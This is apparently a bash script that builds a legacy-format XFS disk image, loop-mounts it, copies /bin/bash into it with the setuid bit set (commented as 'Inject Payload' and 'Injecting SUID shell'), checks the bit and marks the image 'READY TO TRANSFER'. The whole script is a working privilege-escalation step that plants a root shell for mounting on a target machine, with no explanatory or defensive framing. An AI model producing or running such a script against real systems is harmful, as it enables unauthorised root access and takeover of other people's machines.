# 1. Clean up the mess from previous attempts
echo "[*] Cleaning up..."
sudo umount mnt_legacy 2>/dev/null
rm -rf mnt_legacy
rm -f xfs.img
mkdir mnt_legacy

# 2. Create the file (100MB)
echo "[*] Creating file..."
dd if=/dev/zero of=xfs.img bs=1M count=100 status=none

# 3. Format as Legacy XFS
# We use a simpler command syntax to avoid the 'help menu' error
echo "[*] Formatting..."
sudo mkfs.xfs -f -m crc=0 -n ftype=0 xfs.img

# CHECK: Did it work?
if file xfs.img | grep -q "XFS filesystem"; then
    echo "[+] Format SUCCESS. Image is valid XFS."
else
    echo "[-] Format FAILED. Stop here."
    exit 1
fi

# 4. Mount
echo "[*] Mounting..."
sudo mount -o loop xfs.img mnt_legacy

# 5. Inject Payload
echo "[*] Injecting SUID shell..."
sudo cp /bin/bash mnt_legacy/bash
sudo chmod 4755 mnt_legacy/bash

# 6. Verify and Unmount
if ls -la mnt_legacy/bash | grep -q "rws"; then
    echo "[+] SUID bit set. Unmounting..."
    sudo umount mnt_legacy
    echo "[!] READY TO TRANSFER: xfs.img"
else
    echo "[-] Failed to set SUID bit."
fi
